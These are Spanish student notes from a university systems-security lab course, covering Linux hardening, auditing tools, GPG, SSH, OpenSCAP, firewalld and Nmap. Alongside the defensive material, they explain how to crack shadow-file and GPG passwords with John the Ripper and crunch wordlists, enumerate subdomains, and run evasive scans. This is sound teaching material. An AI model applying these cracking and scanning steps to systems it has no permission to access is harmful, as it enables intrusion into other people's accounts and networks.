*Todo este fichero ha sido elaborado gracias a los materiales impartidos en la asignatura de Seguridad de Sistemas Informáticos de La Universidad de Oviedo. Es una guía completa sobre cómo realizar los laboratorios con pequeñas notas extra realizadas por mi*

# 3 Febrero 2023 - Lab1 ⚱️

- Crear un usuario en Linux: `sudo adduser <user>`
- Para generar múltiples usuarios: `sudo useradd`
- Agregar un usuario al grupo sudo: `sudo usermod -aG sudo <user>`
- Cambiar entre usuarios: `su -user`
- Los datos de un usuario se guardan en: `/etc/passwd`
- Comprobar que ssh (o un servicio) funciona: `sudo service ssh status`
- Para cerrar las terminales usar Ctrl+D para conservar los logouts de los .log
- Para ver todo el contenido oculto: `ls -a`
- Para hacer una conexión desde linux: `su - <user>`
- Ctrl+R para ver el histórico
- Para poder ejecutar aplicaciones de otro usuario desde un ssh remoto: `ssh user@ip_addr -X `
- Para ver el estado del cortafuegos: `sudo ufw status`
- Para habilitar el cortafuegos: `sudo ufw enable`
- Para habilitar servicios ssh (o cualquier otro): `sudo ufw allow ssh`
- Para evaluar la configuración de seguridad de la máquina virtual **tool Lynis**: 
	- Descargar el proveedor de software:
	  `sudo wget -O - https://packages.cisofy.com/keys/cisofy-software-public.key | sudo apt-key add -`
	  - Agregar el repositorio de Lynis al SO:
	  `echo "deb https://packages.cisofy.com/community/lynis/deb/ stable main" | sudo tee /etc/apt/sources.list.d/cisofy-lynis.list`
	  - Actualiza la base de datos de paquetes justo después para poder usar los paquetes recién añadidos: `sudo apt update`
	  - Instala el software `sudo apt install lynis` y verifica la versión `lynis show version`
	  - Ejecuta: `lynis audit system` para validar tu máquina virtual
- Nmap cheatsheet:
![[Pasted image 20230204113531.png]]
- Para comprobar que una contraseña es segura visitar: https://password.kaspersky.com/
- Habilitar el software de escaneo de malware / rootkits:
	- Intalar el **tool Chkrootkit** (rootkits): `sudo apt install chkroot`
		- Para comprobar archivos: `sudo chkrootkit -r <file>`
	- Instalar el **tool Rkhunter** (rootkits): `sudo apt install rkhunter`
		- Ejecutar `sudo rkhunter -c` para comprobar que todo está correcto. (NOTA: los resultados se guardan en `(/var/log/rkhunter.log)`)
	- Instalar el **tool ClamAV** (malware): `sudo apt install clamav`
		- Actualizar las firmas del software anti malware: `sudo freshclam` (si no deja, parar el servicio con `sudo service clamav-freshclam stop` y ejecutar `sudo freshclam` de nuevo)
		- Para escanear un directorio usar: `sudo clamscan -r -i <dir>`
  - Para crear un informe de seguridad de una máquina usando Lynis y enviar los resultados a un HTML con formato: 
	  - Instalar el paquete:  `sudo apt install kbtin`
	  - Ejecutar: `sudo lynis audit system | ansi2html > report.html` y visualizar el resultado en cualquier navegador
- Para analizar URL sospechosas para ver si apuntan a una web maliciosa conocida usar el **tool VirusTotal**: https://www.virustotal.com/gui/home/upload
- Para saber si una página web está identificada como maliciosa usar: https://transparencyreport.google.com/safe-browsing/search
- ¿Cómo saber si una página web está ejecutando productos/frameworks con vulnerabilidades conocidas?. Esta info está contenida en las cabeceras http (producto, versión...)
	- Usar el propio navegador:
	 ![[Pasted image 20230204121149.png]]
- Para ver las rutas que siguen los paquetes que mandas por la red usar el **tool traceroute**:
	- Instalación: `sudo apt install tcptraceroute`
	- Uso: `tcptraceroute www.domain.com`
- Para preguntarle a tu servidor DNS cierta información de cualquier nombre de dominio remoto usar el comando `dig`. Tutorial:  https://www.hostinger.es/tutoriales/comando-dig-linux/
	- Usar el comando: `dig @8.8.8.8 domain.com +trace` para ver la ruta 

---
# 10 Febrero 2023 - Lab2 ⚱️

- Para descomprimir un zip en ubuntu: `unzip -d directory "file"`
- El comentario `#!/bin/bash` dice que un script se ejecuta con la shell de bash
- En docker las imágenes reutilizan código (en lugar de que cada máquina ocupe varios gigas)
- Requisitos previos para docker:
````bash
sudo apt install gnome-keyring gnupg2 pass
````
- Para ver las imagenes en docker: `docker images`
- Para ver los contenedores activos: `docker ps` y para ver los inactivos `docker ps -a`
- Para parar un proceso en Linux usar: Ctrl+Z
- Para usar un proceso en background escribir: `bg`
- Para parar un contenedor: `sudo docker stop id`
- Para parar todos los contenedores de golpe usar: `sudo docker stop $(sudo docker ps -q)`
- Para borrar todos los contenedores usar: `sudo docker rm $(sudo docker ps -qa)`
- Para ver los procesos parados usar: `jobs`
- Para devolver un proceso usar: `fg`
- Para salir de un contenedor usar: Ctrl+D
- Para saber si una web está reveleando rutas "secretas": visitar el fichero `robots.txt`
- Para saber si los documentos, imágenes, etc de una web están revelando mucha información de sus autores (*metadatos*) usar: **tool FOCA** o **tool Metashield Clean-up Online** -> https://metashieldclean-up.elevenpaths.com/, o la herramienta local **tool exiftool**
	 - Para instalarla: `sudo apt install exiftool`
	 - Para uso básico: `exiftools -s file`
	 - Más info: https://linuxopsys.com/topics/install-and-use-exiftool-on-linux?utm_content=cmp-true
- ¿Cómo usar Google Hacking? (búsquedas en Google combinadas con el operador **site:** que tienen como objetivo detectar vulnerabilidades, problemas de configuración o información que puedan provocar un ataque):
	- Google Hacking Database (GHDB): https://www.exploit-db.com/google-hacking-database
- Para ver la historia de una página web o de cualquier archivo consultar tool **The Wayback Machine**: https://archive.org/web/
	- Para más información: https://www.elladodelmal.com/2013/04/hacking-con-archivecom-wayback-machine.html
- Para descubrir subdominios registrados de un dominio usar:
	- **tool knockpy** -> https://github.com/guelfoweb/knock o `sudo apt install knockpy`
	- **tool dnsenum** -> https://github.com/fwaeytens/dnsenum
	- tools que son Sitios web:
		- https://dnsdumpster.com/
		- https://search.netcraft.com/
		- https://www.virustotal.com
		- https://crt.sh/
	- Podemos encontrarnos dominios abandonados (que pueden estar realmente **abandonados** o bien **no mantenidos** (siendo ahí donde puede haber más vulnerabilidades))
	- Para hacer un resumen de cada subdominio que encontremos está el **tool eyewitness** https://github.com/ChrisTruncer/EyeWitness
- Para analizar un rango de IPs asociados a un dominio de Internet usar los tools:
	- Para dominios **.com** usar el **tool https://whois.arin.net 
	- Para dominios **.es** usar el **tool https://www.nic.es
- Para hacer escaneos de servicios en un puerto concreto en todo Internet se pueden usar:
	- **tool Zmap**: es más rápido pero por defecto no funciona en redes locales
	- **tool Nmap**: se usa para escaneos LAN en busca de máquinas "vivas"
	- Cheat Sheet Zmap:
![[Pasted image 20230210162031.png]]
 - Cheat Sheet Nmap:
![[Pasted image 20230210162202.png]]
- Para saber cómo cualquier sitio web usa tus datos de navegación para su propio provecho usar el **tool BlackLight** -> http://themarkup.org/blacklight
- ¿Cómo crear un entorno de navegación más seguro?
	- Para tratar con extensiones maliciosas: usar el **tool de navegador uBlock Origin**
	- Para bloquear scripts: usar el **tool de navegador NoScript**
	- Para evitar rastreadores: usar el **tool de navegador Privacy Badger**
- Para comprobar si una de tus cuentas ha sido comprometida: usar la página https://haveibeenpwned.com/
- Para geolocalizar al remitente de un correo electrónico: usar la página https://www.iplocation.net/
	- Podemos obtener la ip de un correo para obtener de manera aproximada el remitente obtenido del campo `x-originating-ip`
![[Pasted image 20230210165124.png]]
![[Pasted image 20230210165144.png]]
![[Pasted image 20230210165202.png]]

---
# 17 Febrero 2023 - Lab3 ⚱️
- En el fichero `/etc/hosts` podemos guardar los ssh que queramos
- Para copiar ficheros entre máquinas: 
````bash
#para mandarlo a una máquina remota
scp my_file user@machine_ip:directory -> scp hola.txt uo285176@ssiserver:/tmp
scp uo285176@ssiserver:/tmp/file . #para mandártelo de una máquina remota
````
- Para ejecutar cualquier comando en una máquina remota: `ssh uo285176@ssiserver "comando"`
- Si la máquina a la que nos queremos conectar no tiene ssh, podemos conectarnos con docker
- Para cifrar archivos usaremos el **tool GPG**
- Para cifrar un archivo con AES256: `gpg --symmetric --cipher-algo AES256 -c supersecreto.txt`
- Con la opción `--armor` genera un contenido no bienario (sino ASCII):
`gpg --symmetric --cipher-algo AES256 -c --armor supersecreto.txt`
- Para desencriptar un fichero con gpg: `gpg --decrypt --output=juanito.txt mensaje-285176.txt.asc`
- GPG Cheatsheet:
![[Pasted image 20230218123606.png]]
- Para generar parámetros Diffie-Hellman: https://2ton.com.au/dhtool/
- Para cifrar discos posteriormente a la instalación de Linux: https://www.howtogeek.com/116032/how-to-encrypt-your-home-folder-after-installing-ubuntu/
- Para cifrar una carpeta y lo que contiene:
````bash
#instalar la app
sudo apt install ecryptfs-utils
#cifra la carpeta con
mount -t ecryptfs cartpeta/ carpeta/
#comprueba que ha sido cifrada con
mount | grep encryptfs
#Para poder leer el contenido de la carpeta de nuevo
sudo umount carpeta/
````
- Para transformar tus datos (codificación de datos) y un gran número de posibles formas de hacerlo usar el **tool Cyberchef**: https://gchq.github.io/CyberChef/. También permite ver metadatos de archivos.
- Para ocultar secretos en imágenes sin alterar lo que la imagen muestra usar el **tool steghide**.
````bash
#para instalarlo
sudo apt-get install -y steghide
#para añadir texto a una imagen
steghide --embed -cf imagen.jpg file.txt
#para extraer los datos ocultos
steghide --extract -sf imagen.jpg
````
Steghide CheatSheet:
![[Pasted image 20230218131147.png]]
- Para ofuscar un código Javascript para hacer más difícil que alguien averigue cómo  implementaste cierta funcionalidad:
	- Copia tu código JavaScript
	- Empaquétalo aquí (sin las etiquetas script y sin el HTML): http://dean.edwards.name/packer/
	- Habilita las opciones de Base62 encode y shrink variable
	- Si ahora quieres "poner bonito" este código usa: http://jsnice.org/ o https://beautifier.io/
	- Ahora para ofuscar AÚN MÁS el código ve a esta página y copia el código ofuscado que ya tenías: https://obfuscator.io/
	- Ahora ya **nunca podrán obtener el código original**
- Para crackear un mensaje cifrado con GPG usar el **tool John the ripper**:
- Hay varias estrategias para romper las contraseñas:
	- **Fuerza bruta**
	- **Diccionarios**
	- **Rainbow tables**: son una serie de hashes precalculados. Se realiza una bísqueda del hash en toda la tabla
````bash
#para instalar john
sudo apt install john
#para descifrar un archivo gpg
gpg2john file.gpg > pass.txt
john --wordlist=ruta_wordlist pass.txt
````
- Para más wordlists:  https://ns2.elhacker.net/wordlists/
- Los archivos cifrados GPG no son directamente procesables con john, por lo que se han de procesar previamente con el **tool gpg2john**: `gpg2john file.asc > pass_to_crack`
John the ripper Cheat sheet:
![[Pasted image 20230218133114.png]]
- Para crackear la clave de un usuario con una wordlist personalizada usar el **tool John the Ripper**. También serán necesarios:
	- Una herramienta para combinar el passwd filtrado y el archivo de shadow (**tool unshadow**)
	- Un generador de wordlists como **tool crunch** `sudo apt install crunch`
	- Consejos para usar crunch:
		- El símbolo **%** significa cualquier número
		- El símbolo **@** significa cualquier letra minúscula
		- Si tecleas una **cadena de caracteres** se tratará como una constante
- Para crear wordlists con crunch mirar: https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/
	- El comando básico sigue esta estructura: `crunch min max charset options`
Crunch Cheat Sheet:
````bash
-b : the maximum size of the wordlist (requires -o START)  
-c : numbers of lines to write to the wordlist (requires -o START)  
-d : limit the number of duplicate characters  
-e : stop generating words at a certain string  
-f : specify a list of character sets from the charset.lst file  
-i : invert the order of characters in the wordlist  
-l : allows the literal interpretation of @,%^ when using -t  
-o : the output wordlist file  
-p : print permutations without repeating characters (cannot be used with -s)  
-q : Like the -p option except it reads the strings from a specified file  
-r : resume a previous session (cannot be used with -s)  
-s : specify a particular string to begin the wordlist with  
-t : set a specific pattern of @,%^  
-z : compress the output wordlist file, accompanied by -o

Reference:  
@ represents lowercase letters  
, represents uppercase letters  
% represents numbers  
^ represents special characters

Examples:
#generar una wordlist de 10 letras minimo y maximo cada palabra con el patrón test%%%... y guardarla en el output
crunch 10 10 -t test%%%... -o output.txt
````
![[Pasted image 20230218150622.png]]
Nota: posteriormente, para crackear el fichero shadow con john usaremos el siguiente comando:
`john -wordlist=/crunch_wordlist.txt /file_to_crack.txt`
- Si usamos fuerza bruta pura con John The Ripper: `john --incremental -max-length=4 passwd.txt`
- Más documentación sobre john the ripper:
	- Modos de craqueo de John: https://www.openwall.com/john/doc/MODES.shtml
	- Preguntas frecuentes de John: https://www.openwall.com/john/doc/FAQ.shtml
	- Ejemplos de John: https://www.openwall.com/john/doc/EXAMPLES.shtml
	- Reglas de la lista de palabras de John: https://www.openwall.com/john/doc/RULES.shtml
	- Más información: https://manualdehacker.com/john-the-ripper-cracking-passwords/

---
# 24 Febrero 2023 - Lab 4 ⚱️
- Para usar ssh sin contraseña:
	- Para generar una clave asimétrica para ssh: `ssh-keygen`
	- Creamos un fichero de configuración en el directorio ~/.ssh: `echo "AddKeysToAgent yes" >> ~/.ssh/config`
	- Para copiar una clave pública a otra máquina usar el comando: `ssh-copy-id server`
	- De esta manera podremos conectarnos a una máquina remota con una clave asimétrica
- Para buscar personas y sus claves: https://www.rediris.es/keyserver/
- Para generar un par de claves usar: `gpg --gen-key`. ESte certificado se almacena en la carpeta /home
- Cada usuario local tiene su propio llavero público y un llavero privado que almacena las claves que genera o importa de otros usuarios o sitios. Para ver las claves en mi llavero privado usar `gpg --list-keys` y para las públicas `gpg --list-public-keys`
- Si tenemos varias claves públicas o privadas pertenecientes a diferentes usuarios podemos ver sus detalles con: `gpg --list-public-keys <username>` o `gpg --list-secret-keys <username>`
- Para poder enviar la clave pública usar: `gpg --armor --export <usuario> > <usuario>._public_key.asc`
- Para validar las claves importadas mediante firmado:
	- Importar la clave con: `gpg --import file.asc`
	- Editar la clave importada: `gpg --edit-key user`
	- Para ver la huella digital usar: `fpr`
	- Para firmar usar: `sign`
- Para cifrar un fichero de manera que sólo una persona concreta pueda leerlo:
	- Encriptamos: `gpg -e -r <username> <file>`
	- Esto generará un archivo `file.gpg`
- Para descifrar un texto cifrado asimétricamente:
	- Desciframos: `gpg -o outputfile -d file_encrypted`
- Para firmar un archivo en texto plano usar: `gpg --clearsign file.txt`
	- La salida es un archivo .asc con el contenido original más la firma digital
	- El receptor puede verificar la firma **siempre que tenga la clave pública del remitente importada en su llavero**: `gpg --verify archivo.txt.asc`
- Para enviar un fichero con contenidos secretos y asegurarte de que ese fichero no se ha modificado durante su envío:
	- Combinar **confidencialidad** e **integridad**
	- Firmar y cifrar con cifrado asimétrico: `gpg -o output.enc -s -e -r user file`
	- Para desencriptarlo: `gpg -o output.txt -d encrypted.enc`
- Para comprobar la integridad de un fichero que has descargado, para asegurarnos de que no se ha corrompido o alguien lo ha alterado maliciosamente:
	- Comprobar con el tool **sha256sum**
	- Comprobar en la página oficial de firmas del programa  (buscar la que se corresponde)
	- Comparar los dos textos para ver si son iguales o no
- Para marcar una imagen con una marca de agua:
	- Usaremos el **tool Image Magick**: `sudo apt install imagemagick`
	- Texto corto, marca de agua grande: `convert -density 150 -fill "rgba(255,0,0,0.25)" -gravity Center -pointsize 80 -draw "rotate -45 text 0,0 <text>" <original image>  <watermarked image>`
	- Marca de agua de dos líneas: `convert -density 150 -fill "rgba(255,0,0,0.50)" -pointsize 15 -draw "rotate -15 text 0,200 '<line of text 1>'" -draw "rotate -15 text -25,260 '<line of text 2>'" <original image> <watermarked image>`
- Para investigar o eliminar los metadatos de cualquier fichero:
	- Usaremos el **tool exiftool**: `sudo apt install exiftool`
	- Hay que tener en cuenta que hay metadatos esenciales y adicionales. Esta herramienta sólo elimina metadatos adicionales.
	- Para consultar los metadatos actuales de una imagen: `exiftool image`
	- Para eliminar todos los metadatos de una imagen. `exiftool -all= image`
	- Ejemplos de uso:
		- https://exiftool.org/examples.html
		- https://exiftool.org/exiftool_pod.html

---
# 3 Marzo 2023 - Lab 5 ⚱️

- Para hacer un reporte en un archivo con fecha con el **tool Lynis** (evaluar la seguridad actual de tu máquina Linux): `sudo lynis audit system > report_$(date +%Y-%m-%d-%T)`. El redireccionamiento a un fichero lo hace el dueño de la terminal (ssiuser). Los pipes los hace el dueño de la terminal.
- Para evitar que alguien arranque tu máquina y adquiera privilegios de **root** entrando en modo single user (modo de manteniemiento):
	- Hay que hacer que root tenga contraseña
	- `sudo grep ^root[*\!]: /etc/shadow`: mira si la password de root está sin definir
	- para ser root sin contraseña: `sudo su -`
- Para detectar a los usuarios que se conectan desde fuera (ssh por ejemplo):
	- Los ficheros `/etc/motd`, `/etc/issue` y `/etc/issue.net` gobiernan los banners de aviso para los logueos por consola (locales y remotos)
	- COmprueba si el fichero existe: `cat /etc/motd`
	- Ejecuta el siguiente comando y verifica que no hay resultados: `grep -E -i -s "(\\\v|\\\r|\\\m|\\\s|$(grep '^ID=' /etc/os-release | cut -d=-f2 | sed -e 's/"//g'))" /etc/motd`
	- Elimina el fichero motd si no es utilizado
	- Mensajes para configurar el motd etc: https://www.tecmint.com/ssh-warning-message-before-login/
	- Obtén información del SO con `uname -a`
	- Para comprobar que no hay nada en el fichero `/etc/issue` o no existe: `grep -E -i "(\\\v|\\\r|\\\m|\\\s|$(grep '^ID=' /etc/os-release | cut -d= -f2 | sed -e 's/"//g'))" /etc/issue`
	- Corrige el fichero con: `echo "Authorized uses only. All activity may be monitored and reported." > /etc/issue`
	- Los contenidos del fichero `/etc/issue.net` son expuestos a todo usuario que se loguee desde conexiones remotas.
	- Ejecuta el siguiente comando para verificar que no se devuelve ningún resultado: `grep -E -i "(\\\v|\\\r|\\\m|\\\s|$(grep '^ID=' /etc/os-release | cut -d= -f2 | sed -e 's/"//g'))" /etc/issue.net`
	- Corrige el fichero con: `echo "Authorized uses only. All activity may be monitored and reported." > /etc/issue.net`
- Para fortalecer las conexiones remotas vía SSH todo lo posible:
	- Eliminamos el daemon de SSH: `apt purge openssh-server`
	- Reinicia la configuración de ssh: `systemctl reload sshd`
	- Ejecuta el siguiente comando para verificar que Uid y Gid son 0/root y Access no da permisos a otros grupos o usuarios: `stat /etc/ssh/sshd_config`
	- Haz dueño a root con: `chown root:root /etc/ssh/sshd_config` y `chmod og-rwx /etc/ssh/sshd_config`
	- Run the following command and verify Uid is 0/root and and Gid is 0/root. Ensure group and other do not have permissions: `find /etc/ssh -xdev -type f -name 'ssh_host_*_key' -exec stat {} \;`
	- Run the following commands to set ownership and permissions on the private SSH host key files: `find /etc/ssh -xdev -type f -name 'ssh_host_*_key' -exec chown root:root {} \;`  
	- `find /etc/ssh -xdev -type f -name 'ssh_host_*_key' -exec chmod 0600 {} \;`
	- Run the following command and verify Access does not grant write or execute permissions to group or other for all returned files: `find /etc/ssh -xdev -type f -name 'ssh_host_*_key.pub' -exec stat {} \;`
	- Run the following commands to set permissions and ownership on the SSH host public key files: `find /etc/ssh -xdev -type f -name 'ssh_host_*_key.pub' -exec chmod 0644 {} \;`
	- `find /etc/ssh -xdev -type f -name 'ssh_host_*_key.pub' -exec chown root:root {} \;`
	- `sshd -T | grep -Ei '^\s*protocol\s+(1|1\s*,\s*2|2\s*,\s*1)\s*'` no debería devolver nada
	- Edit the /etc/ssh/sshd_config file to set the parameter as follows: `Protocol 2`
	- **==Para más info mirar el Benchmark de Ubuntu==**
- Para asegurarte de que el sistema MAC AppArmor está activo y confinando tu navegador:
	-  Instala el tool AppArmor con: `sudo apt install apparmor-utils`
	- Para activarlo: `sudo aa-enforce /etc/apparmor.d/usr.bin.firefox`
	- Para deshabilitarlo: `sudo ln -s /etc/apparmor.d/usr.bin.firefox /etc/apparmor.d/disable/`
	- `sudo apparmor_parser -R /etc/apparmor.d/usr.bin.firefox`
- Para saber que no se instalan paquetes corruptos instalaremos los **tools** **debsums** y **apt-show-versions**:
- Para probarlo seguir estas instrucciones: https://manpages.ubuntu.com/manpages/trusty/man1/debsums.1.html

---
# 10 Marzo 2023 - Lab6 ⚱️
- Usaremos el **tool Scap-workbench** para hacer hardening automático
- Para abrirlo usar: `scap-workbench`
	- Para instalar la herramienta seguir estos pasos: https://www.open-scap.org/tools/openscap-base/#download 
- Para ejecutar apps desde una sesión ssh: `ssh -X user@ip_addr`
- Para retocar las configuraciones del ssh: `sudo vim /etc/ssh/sshd_config`
	- Creamos el directorio `.ssh`
	- Copiamos la clave pública del usuario en .ssh: `cp /home/ssiuser/.ssh/id_rsa.pub .ssh/authorized_keys`
	- Para poder entrar sin que nos pida la password por ssh:
		- Desde usuario: `echo "AddKeysToAgent yes" >> .ssh/config`
		- `ssh -X user@ip_addr`: comprobar que nos pide la passphrase y no la password
- La última versión de las políticas de seguridad: https://github.com/ComplianceAsCode/content 
![[Pasted image 20230310152931.png]]
- Podemos ver los resultados en forma de HTML con show report:
![[Pasted image 20230310153038.png]]
- Para ejecutar oscap sin GUI:
	- Hay que ser **root**
	- Para evaluar el estado de seguridad de la máquina añadir al comando: `xccdf eval`
	- Si queremos intentar remediar automáticamente los controles: `xccdf eval --remediate`
	- Después requiere el parámetro `--profile`
	- Luego requiere el parámetro `--results` y tras un espacio en blanco requiere el archivo .xml para guardar el informe en ese formato
	- Después de los resultados es necesario un parámetro `--report`
	- Ejemplo:
````bash
# Sin remediate
oscap xccdf eval --datastream-id scap_org.open-scap_datastream_from_xccdf_ssg-ubuntu1804-xccdf-1.2.xml --xccdf-id scap_org.open-scap_cref_ssg-ubuntu1804-xccdf-1.2.xml --profile xccdf_org.ssgproject.content_profile_anssi_np_nt28_average --oval-results --results /tmp/xccdf-results.xml --results-arf /tmp/arf.xml --report /tmp/report.html /home/ssiuser/ssi_labs/lab_sessions/lab_06/scap-security-guide-0.1.59-oval-5.10/ssg-ubuntu1804-ds.xml

# Con remediate
oscap xccdf eval --datastream-id scap_org.open-scap_datastream_from_xccdf_ssg-ubuntu1804-xccdf-1.2.xml --xccdf-id scap_org.open-scap_cref_ssg-ubuntu1804-xccdf-1.2.xml --profile xccdf_org.ssgproject.content_profile_anssi_np_nt28_average --oval-results --results /tmp/xccdf-results.xml --results-arf /tmp/arf.xml --report /tmp/report.html --remediate /home/ssiuser/ssi_labs/lab_sessions/lab_06/scap-security-guide-0.1.59-oval-5.10/ssg-ubuntu1804-ds.xml
````
- Para hacer hardening automático a tu SO siguiendo las políticas del paquete **scap-security-guide** usando remediación **OSCAP**:
	- Primero ejecuta una auditoría con Lynis para tener una puntuación base
	- Intenta remediar parte de ellos con la opción remediate de oscap
- Para hacer hardening automático a tu SO siguiendo las políticas del paquete **scap-security-guide** usando remediación con scripts de **bash**:
	- Ve al directorio bash dentro del lab06
	- Ejecuta el perfil de seguridad CIS de ubuntu
- Para hacer hardening automático a tu SO siguiendo las políticas del paquete **scap-security-guide** usando remediación con **Ansible**:
	- Para instalar el **tool Ansible** : `sudo apt install ansible`
	- Busca el .yml correspondiente al SO y cambia hosts: all por hosts:localhost

---
# 17 Marzo 2023 - Lab7 ⚱️
- Para separar interfaces de red en zonas con firewalld para poder asignarles diferentes configuraciones se usa el **tool firewalld**. Para usarlo:
	- Deshabilitar **ufw** con `sudo ufw disable`
	- Instalar el software necesario con: `sudo apt install firewalld firewall-config`
	- ==Ahora reinicia la máquina virtual==
	- Ahora debemos entender como funciona:
		- Distribuye las tarjetas de red en la MV en zonas
		- Las zonas son conjuntos predefinidos de reglas que especifican qué tráfico se debe permitir en función del nivel de confianza en las redes a las que está conectado el equipo
		- Cuando asignas interfaces de red a una zona todas las máquinas conectadas a la misma red pertenecerán a dicha zona.
		- De esta forma puedes atribuír las máquinas por zonas
		- Se cumple el siguiente principio: *el firewall hace de policía e inspector de aduanas de todas las conexiones, poniéndose siempre en medio*
		- Zonas que incorpora **firewalld**:
			- **docker**: contiene todas las redes creadas por los contenedores de Docker
			- **drop**: todas las conexiones entrantes se eliminan sin ninguna notificación (filtered en nmap)
			- **block**: todas las conexiones entrantes son rechazadas (se le notifica al cliente)(closed en nmap)
			- **public**: para uso en áreas públicas no confiables. No confía en otros equipos de la red
			- **external**: para uso en redes externas con enmascaramiento NAT habilitado, cuando el sistema actúa como puerta de enlace o enrutador
			- **internal**: para uso de redes internas, cuando el sistema actúa como puerta de enlace o enrutador. Los otros sistemas son generalmente de confianza.
			- **dmz**: se utiliza para equipos ubicados en una zona desmilitarizada o DMZ
			- **work**: utilizado para máquinas de trabajo. Otros equipos son de confianza
			- **home**: utilizado para máquinas domésticas. Otros equipos son de confianza
			- **trusted**: se aceptan todas las conexiones de red. Confía en todos los equipos.
	- Configuramos la GUI de firewalld:
		- `sudo firewall-config`
		- Agregar eth0 con `sudo firewall-cmd --zone=public --change-interface=eth0`
		- Agregar eth1 con `sudo firewall-cmd --zone=work --change-interface=eth1`
		- Asegúrate de que la zona work tenga habilitado el servicio **ssh**

---
# Lab8-9 ⚱️
## Nivel 1
## Simple puesta en marcha
- Escaneos más típicos de Nmap:
	- **Escaneo de múltiples objetivos**: `nmap <obj1> <obj2> ... <objn>` `nmap 192.168.2.1 192.168.2.100 scanme.nmap.org`
	- **Escaneado de un rango de IPs**: `nmap 192.168.2.1-100`
	- **Escaneado de una red completa**: `nmap 192.168.0.0/24`
	- **Escaneado de una red completa excluyendo ciertos hosts:** `nmap 192.168.0.0/24 --exclude 192.168.2.10`
	- **Identificar el sistema operativo de las máquinas activas**: `nmap -O 192.168.0.0/24`
	- **Escanear sólo un rango de puertos**: `nmap -p 22-80 192.168.0.0/24`

-  Para realizar un escaneo básico de la red y ver todas las máquinas vivas del laboratorio: `nmap 192.168.8.13-74`
- Para realizar un análisis rápido de los servicios en ejecución de una máquina viva: `nmap --top-ports 20 --open <ip_addr>`
	- En lugar de dar una sóla ip puedes dar una lista de IPs en un archivo con la opción `-iL`
- Para detectar el sistema operativo rápidamente usar la opción: `-A`
- Para variar la velocidad del escaneo usar: `T0, T1, T2, T3, T4, T5`
- Para detectar las versiones estándar de servicios/daemons usar: `-sV`
- Para realizar una exploración lenta y detallada usar:
	- `-sS`: análisis TCP SYN, más capaz de evadir *firewalls*
	- `-A`: detecta versiones de servicios y sistemas operativos, realiza un `traceroute` y ejecuta algunos scripts de análisis 
	- `-sV`: investiga puertos para determinar qué servicio y versión se están ejecutando
	- `-O`: activa la detección de la versión y tipo del sistema operativo
	- `-p -`: escanea un rango de puertos (`-` significa todos los puertos)
	- Ejemplo: `sudo nmap -sS -A -sV -O –p – <IP objetivo>`

## Tratar con puertos

- **Nmap** escanea por defecto hasta 1000 de los puertois estadísticamente más usados en todo el mundo en orden aleatorio, lo que equivale a hacer un `-top-ports 1000`
- Ejemplos:
	- `nmap –p 80,443 scanme.nmap.org`: solo escanea x puertos (80 y 443)
	- `nmap –p 100-2000 scanme.nmap.org`: escaneo de puertos aleatorio del 100 al 2000
	- `nmap –p -2000 scanme.nmap.org`: escaneo de puertos aleatorios pero del 1 al 2000
	- `nmap –p 100- scanme.nmap.org`: escaneo de puertos aleatorio pero del 100 al 65536 (nada recomendable)
	- Se pueden usar protocolos concretos asociados a cualquier número de puerto usando letras (`T` TCP, `U` UDP, `S` SCTP, `P` IP). Ej: `nmap -p U:53,11,13,T:22-25,80,443,8080 scanme.nmap.org`
	- También hay dos modificadores adicionales
		- `-F` (escaneo rápido): en lugar de 1000, escanea los 100 puertos más utilizados aleatoriamente
		- `-r`: en lugar de usar un orden aleatorio, usa uno secuencial ascendente

- Estado de los puertos:
	- **Open**: hay un servicio esperando una conexión en este puerto
	- **Closed**: ningún servicio parece estar esperando conexiones en ese puerto
	- **Filtered**: los paquetes Nmap no se reciben en ese puerto, por lo que su estado es desconocido
	- **Unfiltered**: los paquetes Nmap se reciben en ese puerto, pero alguna razón impide que Nmap sepa en qué estado está el puerto
	- **Open/Filtered**: Nmap no puede decidir en cuál de los dos estados está el puerto
	- **Closed/Filtered**: Nmap no puede decidir en cuál de los dos estados está el puerto

## Usar el motor de scripting de "usar y tirar" (escaneo con scripts por defecto)

- Útil si no deseas conocer detalles de dichos scripts

- Usar la opción `-sC`: `nmap -sV -sC 192.168.8.8`

## Nivel 2
## Protocolo TCP

- Las conexiones TCP se componen de 3 etapas:
	- Establecimiento de la conexión (3-way handshake)
	- Transferencia de datos
	- Fin de la conexión

### Establecimiento de la conexión
Aunque es posible que un par de entidades finales comiencen una conexión entre ellas simultáneamente,  normalmente una de ellas abre un socket en un determinado puerto TCP y se queda a la escucha de nuevas  conexiones. Es común referirse a esto como apertura pasiva, y determina el lado servidor de una conexión. 
- El lado cliente de una conexión realiza una apertura activa de un puerto enviando un paquete **SYN** inicial al  servidor como parte de la negociación en tres pasos. En el lado del servidor (este receptor también puede ser una PC o alguna estación terminal) se comprueba si el puerto está abierto, es decir, si existe algún proceso escuchando en ese puerto, pues se debe verificar que el dispositivo de destino tenga este servicio activo y esté aceptando peticiones en el número de puerto que el cliente intenta usar para la sesión. En caso de no estarlo, se envía al cliente un paquete de respuesta con el bit RST activado, lo que significa el rechazo del intento de conexión. 
- En caso de que sí se encuentre abierto el puerto, el lado servidor respondería a la petición **SYN** válida con un paquete **SYN/ACK**.  
- Finalmente, el cliente debería responderle al servidor con un **ACK**, completando así la negociación en tres pasos (SYN, SYN/ACK y ACK) y la fase de establecimiento de conexión. Es interesante notar que existe un  número de secuencia generado por cada lado, ayudando de este modo a que no se puedan establecer conexiones falseadas (**spoofing**)."
![[Pasted image 20230530150222.png]]

### Estructura de un paquete TCP
Esta es la estructura de un paquete TCP. Aparte de los datos, otros campos importantes a recordar son los **puertos de origen y destino** (que indican qué puertos son el origen y el destino de la transmisión de datos), los seis flags (URG, ACK...) que se utilizan en algunos tipos de análisis, y el **tamaño de ventana**, que también se utiliza en otro tipo de análisis.
![[Pasted image 20230530150346.png]]

## Tipos de descubrimiento de hosts avanzados de Nmap
- **Cheatsheet Nmap**:
![[Pasted image 20230530150451.png]]

- **El motor de scripting (`--script=<nombre de script y parámetros>`)**: hay una categoría de scripts (**broadcast**) dedicada a descubrir diferentes tipos de servicios en una red (se puede ver en la cheatsheet). Más info en: https://nmap.org/nsedoc/categories/broadcast.html
- Técnicas avanzadas de **detección**: se describen a continuación y expanden la cheatsheet anterior. Estas técnicas funcionan para los protocolos TCP e IP (y relacionados):
	- **`-PS` (TCP SYN):** Útil cuando los firewalls bloquean las solicitudes ICMP. Acepta lista de puertos. Es una secuencia de inicio de conexión TCP para determinar si un host está activo
